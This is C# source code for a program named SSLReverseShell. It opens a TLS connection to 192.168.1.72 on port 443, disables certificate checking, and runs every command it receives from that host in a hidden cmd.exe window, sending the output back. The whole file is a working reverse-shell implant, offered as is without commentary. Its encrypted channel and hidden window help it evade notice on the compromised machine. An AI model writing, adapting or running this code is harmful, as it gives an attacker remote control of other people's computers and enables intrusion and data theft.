using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace SSLReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            TcpClient tcpSocket = new TcpClient("192.168.1.72", 443);
            NetworkStream shellstream = tcpSocket.GetStream();
            SslStream sslstream = new SslStream(shellstream, false, new RemoteCertificateValidationCallback(ValidateServerCertificate));
            sslstream.AuthenticateAsClient("aalphaas.com", null, System.Security.Authentication.SslProtocols.Tls12, false);
            StreamWriter resultwriter = new StreamWriter(sslstream);
            resultwriter.Write("<<sslshell>> ");
            resultwriter.Flush();
            byte[] resultbytes = new byte[65536];
            int index;
            byte[] sendresultinbytes;
            string command, getcommandresult;
            while ((index = sslstream.Read(resultbytes, 0, resultbytes.Length)) > 0)
            {
                command = Encoding.ASCII.GetString(resultbytes, 0, index);
                getcommandresult = GetCommandOutput(command) + "<<sslshell>> ";
                sendresultinbytes = Encoding.ASCII.GetBytes(getcommandresult);
                sslstream.Write(sendresultinbytes, 0, sendresultinbytes.Length);
                sslstream.Flush();
            }
        }

        static string GetCommandOutput(string command)
        {
            Process commandpmpt = new Process();
            commandpmpt.StartInfo.FileName = "cmd.exe";
            commandpmpt.StartInfo.Arguments = "/c " + command;

            // commandpmpt.StartInfo.RedirectStandardInput = true;
            commandpmpt.StartInfo.RedirectStandardOutput = true;
            commandpmpt.StartInfo.RedirectStandardError = true;

            commandpmpt.StartInfo.UseShellExecute = false;
            commandpmpt.StartInfo.CreateNoWindow = true;
            commandpmpt.Start();
            string finalres = commandpmpt.StandardOutput.ReadToEnd();
            commandpmpt.WaitForExit();
            return finalres;
        }
         static bool ValidateServerCertificate(
         object sender,
         X509Certificate certificate,
         X509Chain chain,
         SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}
